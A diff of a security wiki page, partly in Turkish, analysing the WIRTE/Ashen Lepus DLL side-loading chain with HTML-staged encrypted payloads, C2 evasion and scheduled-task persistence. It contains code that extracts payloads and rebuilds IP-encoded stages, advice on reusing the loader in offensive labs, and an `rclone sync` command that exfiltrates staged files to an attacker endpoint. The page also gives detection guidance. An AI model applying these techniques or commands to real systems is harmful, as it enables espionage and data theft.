@@ -1,22 +1,22 @@
-# Advanced DLL Side-Loading With HTML-Embedded Payload Staging
+# HTML-Embedded Payload Staging ile Advanced DLL Side-Loading
 
 {{#include ../../../banners/hacktricks-training.md}}
 
 ## Tradecraft Overview
 
-Ashen Lepus (aka WIRTE), Orta Doğu diplomatik ağları içinde kalıcılık sağlamak için DLL sideloading, staged HTML payloads ve modüler .NET backdoor’ları zincirleyen tekrarlanabilir bir pattern’i weaponized etti. Bu technique, aşağıdakilere dayandığı için herhangi bir operator tarafından yeniden kullanılabilir:
+Ashen Lepus (aka WIRTE), Middle Eastern diplomatik ağlarda kalıcılık sağlamak için DLL sideloading, staged HTML payloads ve modular .NET backdoors tekniklerini birleştiren tekrarlanabilir bir modeli weaponize etti. Teknik, şu unsurlara dayandığı için herhangi bir operator tarafından yeniden kullanılabilir:<sup>[[1]](#references)</sup>
 
-- **Archive-based social engineering**: zararsız görünen PDF’ler, hedeflere bir file-sharing site’dan bir RAR archive indirmeleri için talimat verir. Archive; gerçekçi görünen bir document viewer EXE, güvenilir bir library’nin adıyla adlandırılmış malicious bir DLL (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) ve bir decoy `Document.pdf` içerir.
-- **DLL search order abuse**: victim EXE’ye çift tıklar, Windows DLL import’unu current directory’den çözer ve malicious loader (AshenLoader) trusted process içinde çalışırken decoy PDF açılır ve şüphe çekilmez.
-- **Living-off-the-land staging**: sonraki her stage (AshenStager → AshenOrchestrator → modules) ihtiyaç duyulana kadar disk üzerinde tutulmaz; bunun yerine zararsız görünen HTML responses içine gizlenmiş encrypted blob’lar olarak teslim edilir.
+- **Archive-based social engineering**: zararsız PDF'ler, hedeflere bir file-sharing sitesinden RAR archive indirmelerini söyler. Archive; gerçek görünümlü bir document viewer EXE, güvenilir bir library'nin adını taşıyan malicious bir DLL (ör. `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`) ve decoy bir `Document.pdf` içerir.
+- **DLL search order abuse**: victim EXE'ye double-click yapar, Windows DLL import'unu current directory'den çözer ve malicious loader (AshenLoader) trusted process içinde çalışırken decoy PDF şüpheyi önlemek için açılır.
+- **Living-off-the-land staging**: sonraki her stage (AshenStager → AshenOrchestrator → modules), ihtiyaç duyulana kadar disk dışında tutulur ve otherwise harmless HTML responses içinde gizlenmiş encrypted blobs olarak teslim edilir.
 
 ## Multi-Stage Side-Loading Chain
 
-1. **Decoy EXE → AshenLoader**: EXE, AshenLoader’ı side-load eder; bu component host reconnaissance yapar, AES-CTR ile encrypt eder ve `token=`, `id=`, `q=`, veya `auth=` gibi dönen parameters içinde, API benzeri paths’e (örn. `/api/v2/account`) POST eder.
-2. **HTML extraction**: C2, yalnızca client IP target region’a geolocate olduğunda ve `User-Agent` implant ile eşleştiğinde sonraki stage’i ele verir; böylece sandboxes boşa düşürülür. Kontroller geçilince HTTP body, Base64/AES-CTR encrypted AshenStager payload’ını içeren bir `<headerp>...</headerp>` blob’u barındırır.
-3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir legitimate binary ile deploy edilir. Binary içine enjekte edilen malicious copy daha fazla HTML fetch eder; bu kez AshenOrchestrator’ı geri kazanmak için `<article>...</article>` kısmını çıkarır.
-4. **AshenOrchestrator**: Base64 JSON config’i decode eden modüler bir .NET controller. Config’in `tg` ve `au` field’ları AES key’i oluşturmak için birleştirilir/hashed edilir; bu key `xrk`’yi decrypt eder. Ortaya çıkan bytes, sonrasında fetch edilen her module blob’u için bir XOR key olarak davranır.
-5. **Module delivery**: her module, parser’ı keyfi bir tag’e yönlendiren HTML comments üzerinden tanımlanır; bu da yalnızca `<headerp>` veya `<article>` arayan statik rules’u bozar. Modules arasında persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) ve file exploration (`FE`) bulunur.
+1. **Decoy EXE → AshenLoader**: EXE, AshenLoader'ı side-load eder; AshenLoader host recon gerçekleştirir, kendisini AES-CTR ile encrypt eder ve `token=`, `id=`, `q=` veya `auth=` gibi rotating parameters içinde, API görünümü veren path'lere (ör. `/api/v2/account`) POST eder.<sup>[[1]](#references)</sup>
+2. **HTML extraction**: C2, sonraki stage'i yalnızca client IP'si target region'a geolocate olduğunda ve `User-Agent` implant ile eşleştiğinde açığa çıkararak sandbox'ları etkisiz kılar. Kontroller başarılı olduğunda HTTP body, Base64/AES-CTR encrypted AshenStager payload'unu içeren bir `<headerp>...</headerp>` blob'u barındırır.
+3. **Second sideload**: AshenStager, `wtsapi32.dll` import eden başka bir legitimate binary ile deploy edilir. Binary içine inject edilen malicious copy daha fazla HTML fetch eder; bu kez AshenOrchestrator'ı almak için `<article>...</article>` bölümünü çıkarır.
+4. **AshenOrchestrator**: Base64 JSON config'i decode eden modular bir .NET controller'dır. Config içindeki `tg` ve `au` fields birleştirilir ve hash'lenerek AES key oluşturulur; bu key `xrk`'yi decrypt eder. Ortaya çıkan bytes, sonrasında fetch edilen her module blob için XOR key olarak kullanılır.
+5. **Module delivery**: her module, parser'ı arbitrary bir tag'e yönlendiren HTML comments aracılığıyla tanımlanır; böylece yalnızca `<headerp>` veya `<article>` arayan static rules aşılır. Modules arasında persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`) ve file exploration (`FE`) bulunur.
 
 ### HTML Container Parsing Pattern
 ```csharp
@@ -26,9 +26,9 @@ var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
 var module = XorBytes(aesBytes, xorKey);
 LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
 ```
-Savunucular belirli bir elementi engellese veya kaldırsalar bile, operatörün teslimatı sürdürmek için yalnızca HTML yorumunda ipucu verilen etiketi değiştirmesi yeterlidir.
+Savunucular belirli bir öğeyi engellese veya çıkarsa bile operator, iletimi sürdürmek için yalnızca HTML yorumunda belirtilen tag'i değiştirmelidir.<sup>[[1]](#references)</sup>
 
-### Quick Extraction Helper (Python)
+### Hızlı Çıkarma Yardımcısı (Python)
 ```python
 import base64, re, requests
 
@@ -40,16 +40,16 @@ blob = base64.b64decode(b64)
 ```
 ## HTML Staging Evasion Parallels
 
-Recent HTML smuggling research (Talos) highlights payloads hidden as Base64 strings inside `<script>` blocks in HTML attachments and decoded via JavaScript at runtime. The same trick can be reused for C2 responses: stage encrypted blobs inside a script tag (or other DOM element) and decode them in-memory before AES/XOR, making the page look like ordinary HTML. Talos also shows layered obfuscation (identifier renaming plus Base64/Caesar/AES) inside script tags, which maps cleanly to HTML-staged C2 blobs. A later Talos writeup on **hidden text salting** is also relevant here: splitting Base64 with irrelevant HTML comments or whitespace is enough to break simple regex extractors while keeping browser-side reconstruction trivial.
+Recent HTML smuggling research (Talos), HTML attachment'larının içindeki `<script>` bloklarında Base64 string'leri olarak gizlenen ve runtime sırasında JavaScript ile decode edilen payload'ları öne çıkarıyor.<sup>[[2]](#references)</sup> Aynı yöntem C2 response'ları için de yeniden kullanılabilir: şifrelenmiş blob'ları bir script tag'inin (veya başka bir DOM element'inin) içine stage edip AES/XOR işleminden önce memory içinde decode ederek sayfanın sıradan bir HTML gibi görünmesini sağlamak. Talos ayrıca script tag'leri içinde katmanlı obfuscation (identifier renaming ve Base64/Caesar/AES birleşimi) kullanıldığını gösteriyor; bu yaklaşım HTML-staged C2 blob'larına kolayca uyarlanabilir.<sup>[[2]](#references)</sup> Talos'un **hidden text salting** hakkındaki daha sonraki writeup'ı da burada önemlidir: Base64'ü ilgisiz HTML comment'leri veya whitespace ile bölmek, browser tarafında reconstruction işlemini basit tutarken basit regex extractor'larını bozmak için yeterlidir.<sup>[[7]](#references)</sup>
 
 ## Recent Variant Notes (2024-2025)
 
-- Check Point observed WIRTE campaigns in 2024 that still hinged on archive-based sideloading but used `propsys.dll` (stagerx64) as the first stage. The stager decodes the next payload with Base64 + XOR (key `53`), sends HTTP requests with a hardcoded `User-Agent`, and extracts encrypted blobs embedded between HTML tags. In one branch, the stage was reconstructed from a long list of embedded IP strings decoded via `RtlIpv4StringToAddressA`, then concatenated into the payload bytes.
-- OWN-CERT documented earlier WIRTE tooling where the side-loaded `wtsapi32.dll` dropper protected strings with Base64 + TEA and used the DLL name itself as the decryption key, then XOR/Base64-obfuscated host identification data before sending it to the C2.
+- Check Point, 2024'te hâlâ archive-based sideloading üzerine kurulu olan ancak ilk stage olarak `propsys.dll` (stagerx64) kullanan WIRTE campaign'lerini gözlemledi. Stager, bir sonraki payload'ı Base64 + XOR (key `53`) ile decode ediyor, hardcoded bir `User-Agent` ile HTTP request'leri gönderiyor ve HTML tag'leri arasına gömülü encrypted blob'ları extract ediyor. Bir branch'te stage, `RtlIpv4StringToAddressA` ile decode edilen uzun bir embedded IP string listesi üzerinden yeniden oluşturuluyor ve ardından payload byte'larına concatenate ediliyordu.<sup>[[3]](#references)</sup>
+- OWN-CERT, side-loaded `wtsapi32.dll` dropper'ının string'leri Base64 + TEA ile koruduğu ve DLL name'in kendisini decryption key olarak kullandığı daha eski WIRTE tooling'ini belgeledi; ardından C2'ye göndermeden önce host identification data'yı XOR/Base64 ile obfuscate ediyordu.<sup>[[4]](#references)</sup>
 
 ## Reconstructing IP-Encoded Stages
 
-WIRTE's 2024 `propsys.dll` branch shows that the next PE does not need to live as one contiguous HTML blob. The loader can stash stage bytes as dotted-quad strings and rebuild them with `RtlIpv4StringToAddressA`, a pattern closely related to Hive's **IPfuscation** tradecraft. Operationally this is useful when the actor wants the HTML page to contain what looks like harmless IOCs or config data instead of an obvious Base64 payload.
+WIRTE'ın 2024 `propsys.dll` branch'i, bir sonraki PE'nin tek ve kesintisiz bir HTML blob'u olarak bulunmasının gerekmediğini gösteriyor. Loader, stage byte'larını dotted-quad string'ler olarak stash edip `RtlIpv4StringToAddressA` ile yeniden oluşturabilir; bu, Hive'ın **IPfuscation** tradecraft'ıyla yakından ilişkili bir pattern'dir.<sup>[[3]](#references)[[5]](#references)</sup> Operasyonel olarak bu yöntem, actor HTML page'in obvious bir Base64 payload yerine zararsız görünen IOC'lar veya config data içermesini istediğinde kullanışlıdır.
 ```python
 import pathlib, re, socket
 
@@ -58,65 +58,67 @@ ips = re.findall(r'((?:\d{1,3}\.){3}\d{1,3})', text)
 blob = b"".join(socket.inet_aton(ip) for ip in ips)
 pathlib.Path("stage.bin").write_bytes(blob)
 ```
-If the recovered bytes begin with `MZ`, you likely reconstructed the next PE directly. If not, check for a leading XOR/Base64 layer or small delimiter chunks between addresses.
+Kurtarılan byte'lar `MZ` ile başlıyorsa, muhtemelen bir sonraki PE'yi doğrudan yeniden oluşturmuşsunuzdur. Başlamıyorsa, başta bir XOR/Base64 katmanı veya adresler arasında küçük delimiter parçaları olup olmadığını kontrol edin.
 
-## Swappable DLL Names & Host Rotation
+## Değiştirilebilir DLL İsimleri ve Host Rotasyonu
 
-Bu pattern’in güçlü bir özelliği, **HTML/AES/XOR staging backend’in aynı kalabilmesi, yalnızca sideload pair’in değişmesidir**. WIRTE, kampanyalar boyunca `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` ve `propsys.dll` arasında rotasyon yaptı; bu faydalıdır çünkü:
+Bu modelin güçlü bir özelliği, **HTML/AES/XOR staging backend'inin yalnızca sideload çifti değiştirilerek aynı kalabilmesidir**. WIRTE kampanyalar boyunca `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll` ve `propsys.dll` arasında rotasyon yaptı; bu kullanışlıdır çünkü:<sup>[[1]](#references)[[3]](#references)</sup>
 
-- `propsys.dll` ve `wtsapi32.dll`, defenders’ın `%System32%` / `%SysWOW64%` içinde bulunmasını beklediği sıradan Windows DLL isimleridir.
-- **HijackLibs** gibi public catalog’lar, bu DLL isimlerini kopyalanmış bir application directory’den yükleyecek birçok binary’yi zaten eşleştirir; bu da operatörlere stager’i yeniden tasarlamadan replacement host sağlar.
-- Sadece export surface, host başına uyarlanmalıdır. HTML parser, AES/XOR rutinleri ve module loader genellikle değiştirilmeden bir forwarding proxy DLL’e taşınabilir.
+- `propsys.dll` ve `wtsapi32.dll`, defender'ların `%System32%` / `%SysWOW64%` içinde bulunmasını beklediği sıradan Windows DLL isimleridir.
+- **HijackLibs** gibi public catalog'lar, kopyalanmış bir application directory içinden bu DLL isimlerini yükleyecek birçok binary'yi zaten eşleştirir; bu da operator'lara stager'ı yeniden tasarlamadan replacement host'lar sağlar.
+- Her host için yalnızca export surface uyarlanmalıdır. HTML parser'ı, AES/XOR rutinleri ve module loader genellikle bir forwarding proxy DLL içine değiştirilmeden aktarılabilir.
 
-Offensive lab çalışmaları için bu, problemi **(1) seçtiğiniz DLL adını local olarak resolve eden stabil signed bir host bulmak** ve **(2) aynı staged-HTML loader logic’i o DLL’in arkasında yeniden kullanmak** şeklinde ayırabileceğiniz anlamına gelir.
+Offensive lab çalışmaları açısından bu, problemi **(1) seçtiğiniz DLL ismini yerel olarak çözen kararlı bir signed host bulmak** ve **(2) aynı staged-HTML loader mantığını bu DLL'in arkasında yeniden kullanmak** olarak ayırabileceğiniz anlamına gelir.
 
-## Crypto & C2 Hardening
+## Crypto ve C2 Hardening
 
-- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
-- **Key material variations**: earlier loaders used Base64 + TEA to protect embedded strings, with the decryption key derived from the malicious DLL name (e.g., `wtsapi32.dll`).
-- **Infrastructure split + subdomain camouflage**: staging servers are separated per tool, hosted across varying ASNs, and sometimes fronted by legitimate-looking subdomains, so burning one stage doesn't expose the rest.
-- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
-- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
-- **User-Agent pinning + safe redirects**: C2 infrastructure responds only to exact UA strings and otherwise redirects to benign news/health sites to blend in.
-- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.
+- **Her yerde AES-CTR**: mevcut loader'lar 256-bit key'ler ile nonce'ları (ör. `{9a 20 51 98 ...}`) embed eder ve isteğe bağlı olarak decryption öncesinde veya sonrasında `msasn1.dll` gibi string'ler kullanarak bir XOR katmanı ekler.<sup>[[1]](#references)</sup>
+- **Key material varyasyonları**: daha önceki loader'lar, embedded string'leri korumak için Base64 + TEA kullanıyordu; decryption key'i malicious DLL isminden (ör. `wtsapi32.dll`) türetiliyordu.<sup>[[4]](#references)</sup>
+- **Infrastructure split + subdomain camouflage**: staging server'ları tool başına ayrılır, farklı ASN'ler üzerinden host edilir ve bazen legitimate görünümlü subdomain'lerin arkasına alınır; böylece tek bir stage'in açığa çıkması geri kalanını ifşa etmez.
+- **Recon smuggling**: enumerate edilen data artık yüksek değerli application'ları tespit etmek için Program Files listing'lerini de içerir ve host'tan çıkmadan önce her zaman encrypt edilir.
+- **URI churn**: query parameter'ları ve REST path'leri kampanyalar arasında rotasyon yapar (`/api/v1/account?token=` → `/api/v2/account?auth=`); bu, kırılgan detection'ları geçersiz kılar.
+- **User-Agent pinning + güvenli redirect'ler**: C2 infrastructure yalnızca tam eşleşen UA string'lerine yanıt verir; aksi durumda normal traffic'e karışmak için benign news/health site'larına redirect yapar.
+- **Gated delivery**: server'lar geo-fenced'dir ve yalnızca gerçek implant'lara yanıt verir. Onaylanmamış client'lara şüphe uyandırmayan HTML gönderilir.
 
-## Persistence & Execution Loop
+## Persistence ve Execution Loop
 
-AshenStager, Windows bakım işleri gibi görünen ve `svchost.exe` üzerinden çalışan scheduled tasks bırakır; örn.:
+AshenStager, Windows maintenance job'larını taklit eden ve `svchost.exe` üzerinden çalışan scheduled task'ler bırakır; örneğin:<sup>[[1]](#references)</sup>
 
 - `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
 - `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
 - `C:\Windows\System32\Tasks\Automatic Windows Update`
 
-Bu görevler, boot sırasında veya belirli aralıklarla sideloading chain’i yeniden başlatır; böylece AshenOrchestrator, diske tekrar dokunmadan yeni modules talep edebilir.
+Bu task'ler sideloading chain'i boot sırasında veya belirli aralıklarla yeniden başlatır ve AshenOrchestrator'ın diske tekrar dokunmadan fresh module'ler istemesini sağlar.
 
-## Using Benign Sync Clients for Exfiltration
+## Exfiltration için Benign Sync Client'ların Kullanılması
 
-Operatörler diplomatik belgeleri dedicated bir module üzerinden `C:\Users\Public` içine stage eder (dünyadan okunabilir ve şüpheli değildir), ardından o dizini attacker storage ile senkronize etmek için legit [Rclone](https://rclone.org/) binary’sini indirir. Unit42, bunun bu actor’ün exfiltration için Rclone kullandığının ilk gözlemi olduğunu ve normal traffic içine karışmak için legit sync tooling’i kötüye kullanma yönündeki daha geniş trend ile uyumlu olduğunu belirtiyor:
+Operator'lar diplomatic document'ları özel bir module aracılığıyla `C:\Users\Public` içine stage eder (`world-readable` ve şüphe uyandırmaz), ardından bu directory'yi attacker storage ile synchronize etmek için legitimate [Rclone](https://rclone.org/) binary'sini indirir. Unit42, bu actor'ün exfiltration için Rclone kullandığının ilk kez gözlemlendiğini belirtiyor; bu durum, legitimate sync tooling'i normal traffic'e karışmak için abuse etme yönündeki daha geniş trend ile uyumludur:<sup>[[1]](#references)</sup>
 
-1. **Stage**: hedef dosyaları `C:\Users\Public\{campaign}\` içine kopyala/topla.
-2. **Configure**: attacker-controlled bir HTTPS endpoint’i gösteren Rclone config gönder (örn. `api.technology-system[.]com`).
-3. **Sync**: `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` çalıştır; böylece traffic normal cloud backup gibi görünür.
+1. **Stage**: hedef file'ları `C:\Users\Public\{campaign}\` içine copy/collect edin.
+2. **Configure**: attacker-controlled bir HTTPS endpoint'ine (ör. `api.technology-system[.]com`) işaret eden bir Rclone config gönderin.
+3. **Sync**: traffic'in normal cloud backup'larına benzemesi için `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` komutunu çalıştırın.
 
-Rclone, legit backup workflows için yaygın kullanıldığı için defenders anormal executions’a odaklanmalıdır (yeni binaries, garip remotes veya `C:\Users\Public` içinden ani sync işlemleri).
+Rclone legitimate backup workflow'larında yaygın olarak kullanıldığından, defender'lar anomalous execution'lara (yeni binary'ler, olağandışı remote'lar veya `C:\Users\Public`'in aniden sync edilmesi) odaklanmalıdır.
 
-## Detection Pivots
+## Detection Pivot'ları
 
-- Kullanıcı tarafından yazılabilir path’lerden beklenmedik şekilde DLL yükleyen **signed processes** için alarm üretin (Procmon filters + `Get-ProcessMitigation -Module`), özellikle DLL isimleri `netutils`, `srvcli`, `dwampi`, `wtsapi32` veya `propsys` ile örtüşüyorsa.
-- Şüpheli HTTPS responses içinde **alışılmadık tag’lerin içine gömülü büyük Base64 blob’lar** veya `<!-- TAG: <xyz> -->` yorumlarıyla korunmuş içerik olup olmadığını inceleyin.
-- Önce HTML’yi normalleştirin: **Base64 extraction’dan önce comments’i temizleyin ve whitespace’i sıkıştırın**, çünkü hidden-text-salting tarzı evasion payload’ları comment sınırlarına bölebilir.
-- HTML hunting’i, JavaScript tarafından AES/XOR processing öncesi decode edilen **`<script>` blokları içindeki Base64 strings** için de genişletin (HTML smuggling-style staging).
-- Özellikle çevredeki strings gerçek network targets yerine uzun IPv4 listeleri olduğunda, **`RtlIpv4StringToAddressA` çağrılarının ardından buffer assembly** tekrarlarını arayın.
-- `svchost.exe`’yi non-service arguments ile çalıştıran veya dropper directories’e geri işaret eden **scheduled tasks** için avlanın.
-- Yalnızca tam `User-Agent` strings için payload döndüren ve aksi halde legit news/health domains’e yönlenen **C2 redirects**’i takip edin.
-- IT-managed location’lar dışında görünen **Rclone** binaries, yeni `rclone.conf` dosyaları veya `C:\Users\Public` gibi staging directories’den çeken sync jobs için izleme yapın.
+- User-writable path'lerden beklenmedik şekilde DLL yükleyen **signed process**'ler için alert oluşturun (Procmon filter'ları + `Get-ProcessMitigation -Module`); özellikle DLL isimleri `netutils`, `srvcli`, `dwampi`, `wtsapi32` veya `propsys` ile örtüşüyorsa.<sup>[[6]](#references)</sup>
+- Olağandışı tag'lerin içine embed edilmiş **büyük Base64 blob'ları** veya `<!-- TAG: <xyz> -->` comment'leriyle korunan şüpheli HTTPS response'larını inceleyin.
+- Önce HTML'i normalize edin: Base64 extraction işleminden önce **comment'leri kaldırın ve whitespace'i birleştirin**; çünkü hidden-text-salting tarzı evasion, payload'ları comment sınırları boyunca bölebilir.
+- HTML hunting kapsamını, **`<script>` block'ları içindeki Base64 string'lerini** de içerecek şekilde genişletin (HTML smuggling tarzı staging); bunlar AES/XOR processing öncesinde JavaScript ile decode edilir.
+- Özellikle çevredeki string'ler gerçek network target'ları yerine uzun IPv4 listeleri olduğunda, **`RtlIpv4StringToAddressA` sonrasında buffer assembly işlemlerinin tekrarlandığı** durumları araştırın.
+- `svchost.exe`'yi non-service argument'larla çalıştıran veya dropper directory'lerine işaret eden **scheduled task**'leri araştırın.
+- Yalnızca tam `User-Agent` string'leri için payload döndüren ve aksi durumda legitimate news/health domain'lerine yönlendiren **C2 redirect**'lerini takip edin.
+- IT tarafından yönetilen konumların dışında görünen **Rclone** binary'lerini, yeni `rclone.conf` file'larını veya `C:\Users\Public` gibi staging directory'lerinden veri çeken sync job'larını monitor edin.
 
 ## References
 
-- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
-- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
-- [Hamas-affiliated Threat Actor WIRTE Continues its Middle East Operations and Moves to Disruptive Activity](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
-- [WIRTE: In Search of Lost Time](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
-- [Hive Ransomware Deploys Novel IPfuscation Technique To Avoid Detection](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
-- [Potential System DLL Sideloading From Non System Locations](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
+- [1] [Hamas'a bağlı Ashen Lepus, Yeni AshTag Malware Suite ile Orta Doğu'daki Diplomatic Entity'leri Hedefliyor](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
+- [2] [Tag'ler arasında gizli: HTML smuggling'deki evasion technique'lerine dair içgörüler](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
+- [3] [Hamas'a bağlı Threat Actor WIRTE, Orta Doğu Operasyonlarına Devam Ediyor ve Disruptive Activity'ye Geçiyor](https://research.checkpoint.com/2024/hamas-affiliated-threat-actor-expands-to-disruptive-activity/)
+- [4] [WIRTE: Kayıp Zamanın Peşinde](https://www.own.security/en/ressources/blog/wirte-analyse-campagne-cyber-own-cert)
+- [5] [Hive Ransomware Detection'dan Kaçınmak için Novel IPfuscation Technique Kullanıyor](https://www.sentinelone.com/blog/hive-ransomware-deploys-novel-ipfuscation-technique/)
+- [6] [System Dışı Konumlardan Potential System DLL Sideloading](https://detection.fyi/sigmahq/sigma/windows/image_load/image_load_side_load_from_non_system_location/)
+- [7] [Hidden-text salting ile email threat'lerini çeşnilendirme](https://blog.talosintelligence.com/seasoning-email-threats-with-hidden-text-salting/)
+
 {{#include ../../../banners/hacktricks-training.md}}
